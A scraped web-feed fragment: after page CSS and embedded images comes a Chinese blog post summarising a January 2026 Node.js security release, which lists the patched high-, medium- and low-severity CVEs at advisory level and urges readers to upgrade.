O+DJnKA2opFY1Rjru5CE7kOcO0jJtQVUIynzuZEMeb+1CEOFXN8iFSGeRpCm1BTlJxVg49Azm819SO7Bu0axEbwn27GuxMck+TMQHDP8fn48gfDVIL4R8xKVPJ73MQBUIfA/Z54LMw5vmlE+w+VFo2A78X/SsyPA/RMD0z3e2qVLtfo7aeBslpMX0N0TEnLcUlKym1jyBFqSohmYntI5enBhYB9CY/2kNarhwJhNiMtRGyWnkQdKaCFyQwgydjyNUw4VchKxXv2/DoKdC+lkQbCX1NlKCGvJiBJkSGbCus6jfo4yGBNySgr+u7e20BCsxdVAcFlJ/tHd32+cIsNxSXUULUUx+dg/d47g7OPYFw2MxkSuyMwLHVTI6PBN6dS8Sppw45zHJSgDXV3aQzmz40Z6fDgBfiAXU0uZxby2zejee+j3eltoQMzhV6qSBogXwrEXDj7ElWxUQ8RrnSaoU0dxIsKaiMvMykXTu90NqJsGHP4z78SdLigUrLKat32nFwy/E07pfDFRdQ/7N5r57pQ1482uvWhMGhQcviGkVrKDUp0ToCxfhQal5n4Hs/g1jOgH4LWdwFOd1b1WzHET4vLZppv+Czjxo840OrDlG8jAJzv2tp5mLK1dsU/lfIOeWy5NxFxfl2BoYImlQtx9QF6mJRQKBsQYYuO2yaLYPBUXvu/VqYPxtHhNy7Y4hCkNLGPtKSklzCVKSHtMQxcqm5Kw1DhI2PTGZtcGDAvoLQ/u7MifYtWFBlxz2H9zo8RkwKzC5UYiG+p44ccqE62YAxLeT/TOpf8MXx8Qk0IJFRY1Go+viQVJpE5Ehjf49xfAZeqGIy/7us3nqxwQfCkjZypPxobVr/6YpQHIalUvuCyEwbSXC9PC8QnkFcXlrgLpoLIhIfKuaqlQkYIAwQnr/f3eyu7KttOw2lNpv8/BPHyjzVNER3o72gvEBKqRMTflndbP8BMweRDyeciEj5bFayFXqTLzheivgYJC0jwzwHa0MDDEotm48ndze5BBBElAnxxcRYHAFh3FfZaA9UNRmC354kNwUx8eHkmVj5dcTE5ZMnuEyr1QqlhtaJLuOYZv4v3KNo0TKrGPUZ1NILPKuWcvVn5Trv10SMB6h0j/ARMnlOuafCBIfnSWEx/Raif3HDzofYMM31dOyY9LBaLK3TjoX2fEqT4+2qaUVWSTQvyM6wC8nNJyEetXIyuLKrx04P7MKNnbJZlKUtNAIHo7i2dA/YU3Vtdi5l6jCepXy8hOedSSSsI8/HQg5Q+gxTKXwkMHkbESo+hjG0lbRRzQ3Fc5LOzDuFhs3Ptumpie7ilRDhlEJOq/hjsZljCxjkt7fWuPS/EekpXMggJQIk0G+eN9Xu2VmHWIkJe0nJRN4ptBBit2yutG9ML7J1DHAxebiAMrZ4VZlduqGS8I2tJc2iborUxmIN79c+kTovFxivPvrcSaP3n7RSKYTUmKt4N3rMOcw4JOneD3sP956jNaMglIeTER5Xbdlt15Tm2W10NEsYrA/N5JLCHHsR9tSqwxq08G3bqm1ZTbOtagnbo6SLvH/VzBL7W7jPzqFea0LmMLFzUuLtdwumuO3i1Vtq7OK15Xgw3l1PDmIXak+6QBEkvB9YJIzBcc/L20JIYaSZ/qAzVm5Ut4oowk3QehC+N3xo/1wTqt7zsYawfX9no9XjqdPXVLhrwyo/wucJYQkE1e4j8rLcBuHUItQQKqgMXb6LGvxFQlXw33AdZLR0V5P9Fr29lP73scNnosoyvdWPv4fPJ+uJrLVtMakqaL1M1cTvv0OLIZE6wk2a2IcIRUQh+DaejpdcXepBa7bKDRGM9PIVxTl2EwarZ72rooVuY4RQtMypdk6e1lLLehhY2lt7QEd7WxlCDvdIli6E9B4+ZIodmZEMccUGqgiZOqru9tkR3iJ8nCcXRWRZCSPMLPEjlx2LjQL1OM5qKAm+vhSuRqSfV5Ttrg8FdWcrnhMqCTex7DEM6qTsVEuM1+8hovaHQ6e6a1Fz0xLd3nUt4ToWWuzWNkhcoAIIjUx2ZpxjLzWF9+SYmngR1lok4TEoJxGfuijhI/7OICoFmadl2llcL9b1oRVJtbD+JLlv1KrhHG5811t9ELbzgk14ICUwqE+TDzftqHPz98vUSy3jSIwP8dCpkNqLDPTx+rArz4T5qLG3G2PrvJKKPoLBWE501NC3ilUX5mVjVIb9nIbgWcpPMiSXjbcL8K62UkR86m1/yfkSeMaHFuK04X0CE3J6SWzFUxw0BSNHlSzi3RmIRJwHq5udO3c16quLp6sbnffbupxbt+12vzOrzuvNHc7ycRbIxuJHgYU7YSASdQgxp7qz2ynv6HJeqW91doa7nLruXof+17sqhhu31Xif9o7HalqczV29Dnrb/f5EXZvzdH27U98/6LR5i3N0UM5zjHU71/lwjRWWltU5CAIn7F1MqLp/r9hQ5RoaxG+qmrxP4yNKcfsFLwuiprffeb2l03m2scO5h3Or2rudzjGrhk8x4Cqu2xcexilBvNEcdi5Yu4tKF3Ue4tzPy+td5/1md4tzw5iJ27NuXEYobYUdlb8z6GTWkdxaCvk2zHjd5mpKQ459mv5TkAp6mQb9Aq9HHQ8S6mrZnuc6vUG6WHusIhCJGNXl9byvnJyaiE7+Eoz8c5TYNQiUveENGpJpcIJ+biS8R0+rlcazGNs7pKB+zPLTOSX2KNWhlDAf4r2Spj72JORB5OyHULX+dlD/FOky/HFy5ygYU0sey/i8moeqdunXK1qC3RuaMOYHlI/raQMl3M+EeTV5WxD3Km8a8PkM8nr648sQ9+esKbf5e/nxiKBfAOQkxbv3SU9LYmqPV9V/Pn+V20VwTyVjTqCI6edEQUOFUXs9WmfSll8DyX2dt7GlnwkswaM3l9XZ0oNK3MTXbxpOV2sGk69s6XCJw4cY8KbyRrt9TrHt7Bm0rRBQe1+fHUWNfaapU0KbqxzbORC1M/LS3dJwIl3KOrwykQG/E+61q+isgniztdOKqNOziDgZqZIzFwPvqGiyg5NCtoCqoG5NxHhPZTOsnORulKskjoKMDeLuXQ3OmnC3syxARFXdfc57LR3OrdtrvSOOs55rnqhtcdoGhpxHdjc5EfJUuHZTlftX+G15rXPlhkrnLe59F7Lz8VGHdg8c5y2OLeMZ126qduq9XC3v7nd+FchLvYPJd15gPCu8XQnh/qpm59WGVudZzvvQO97kXTcGxhnEuJvR39tWY8cwK4uhcikk4a3Gdstg9l5B2t0wfaTdWkEou5vCPOV5PH73vFL3+DfXltnh6OxjkJD6Wd5F3g88tMe6CW/7YmI99VIL4u0oqUK8ocW4d8hFrXMVoOQU8s3U97MnjvDD/XRYkyhHM1MT3GVZQR2Tdv70U8EbA5vlo+CaPAaaSWoZXm50otGodxQ6L6txGKxzw5ZYORrBsPPrykZKQIy1n8bTjwb2fO4Te3ue7x6KOKvaYns1wtIddd4nx3mwot55qyl2360cp81zurg+CGqwU8v4/Of5uAVvPgObrwvHomY8jOtZ4fXWLnefdHVXv9044+8ZklCx75DXwcV1Sb27y+vInUQEuVYSaMgRJYfAwtoj0raFxIUW1A8nz35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>Node.js 官方在 2026 年 1 月 13 日更新修复了多个严重安全漏洞，涉及缓冲区泄露、权限绕过、DoS 攻击等，影响所有活跃版本，建议所有用户尽快升级！</p>
<h4 data-id="heading-1">往期精彩推荐</h4>
<ul>
<li><a href="https://juejin.cn/post/7587965908288749578" target="_blank" title="https://juejin.cn/post/7587965908288749578">AudioDock：服务器和 NAS 音频播放最棒的软件！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">pnpm + monorepo 才是 AI 协同开发的最佳方案！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">尤雨溪强烈推荐的这个库你一定要知道 ⚡️⚡️⚡️</a></li>
<li>更多精彩文章欢迎关注我的公众号：萌萌哒草头将军</li>
</ul>
<h3 data-id="heading-2">正文</h3>
<p>本次安全发布主要针对 Node.js 当前所有活跃版本（20.x、22.x、24.x、25.x）发布了补丁，累计修复了 <strong>3 个 高危</strong>、<strong>4 个 中危</strong> 和 <strong>1 个 低危</strong> 严重性的漏洞，</p>
<p>同时更新了核心依赖 c-ares 和 undici。</p>
<h4 data-id="heading-3">主要高危漏洞：</h4>
<ol>
<li><strong>CVE-2025-55131</strong>（High）</li>
</ol>
<p>Timeout 导致的竞态条件，使得 Buffer.alloc / Uint8Array 可能分配到未清零的内存，存在敏感信息泄露风险（密钥、token 等）。需要特定时机或攻击者控制超时行为才能利用，但危害极大。</p>
<ol start="2">
<li><strong>CVE-2025-55130</strong>（High）</li>
</ol>
<p>使用精心构造的相对路径符号链接，可绕过 <code>--allow-fs-read</code> / <code>--allow-fs-write</code> 权限限制，实现任意文件读写。严重破坏了 Permission Model 的隔离能力。</p>
<ol start="3">
<li><strong>CVE-2025-59465</strong>（High）</li>
</ol>
<p>HTTP/2 服务器在收到畸形 HEADERS 帧时会直接抛出未处理的 TLSSocket 错误，导致进程崩溃（远程 DoS）。未加 error 监听的 HTTPS 服务尤其危险。</p>
<h4 data-id="heading-4">中危漏洞：</h4>
<ul>
<li><strong>CVE-2026-21636</strong>（Medium）：</li>
</ul>
<p>权限模型下 Unix Domain Socket 未受 <code>--allow-net</code> 限制，可连接任意本地 socket，存在提权风险（仅影响 v25）</p>
<ul>
<li><strong>CVE-2025-59466</strong>（Medium）：</li>
</ul>
<p>async_hooks 场景下栈溢出错误无法被捕获，直接终止进程（DoS）</p>
<ul>
<li><strong>CVE-2026-21637</strong>（Medium）：</li>
</ul>
<p>TLS PSK/ALPN 回调中同步异常会绕过错误处理，导致崩溃或 fd 泄漏</p>
<h4 data-id="heading-5">低危漏洞</h4>
<ul>
<li><strong>CVE-2025-55132</strong>（Low）：</li>
</ul>
<p>fs.futimes() 可绕过只读权限修改文件时间戳（痕迹清理）。</p>
<p><strong>受影响版本</strong>：所有活跃分支 20.x、22.x、24.x、25.x（EOL 版本同样受影响，但官方不再修复）<br/>
<strong>修复版本</strong>：2025 年 12 月 15 日之后发布的最新 20.x / 22.x / 24.x / 25.x 版本</p>
<h3 data-id="heading-6">最后</h3>
<p>强烈建议生产环境尽快升级到最新版本，同时关注后续的 async_hooks DoS 缓解方案。</p>
<p>今天的分享就这些了，感谢大家的阅读，如果文章中存在错误的地方欢迎指正！</p>
<h4 data-id="heading-7">往期精彩推荐</h4>
<ul>
<li><a href="https://juejin.cn/post/7587965908288749578" target="_blank" title="https://juejin.cn/post/7587965908288749578">AudioDock：服务器和 NAS 音频播放最棒的软件！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">pnpm + monorepo 才是 AI 协同开发的最佳方案！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">尤雨溪强烈推荐的这个库你一定要知道 ⚡️⚡️⚡️</a></li>
<li>更多精彩文章欢迎关注我的公众号：萌萌哒草头将军</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（43）Hibernate中的级联删除如何实现？]]></title>    <link>https://juejin.cn/post/7595178023256899603</link>    <guid>https://juejin.cn/post/7595178023256899603</guid>    <pubDate>2026-01-15T11:46:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595178023256899603" data-draft-id="7595150851477815339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta 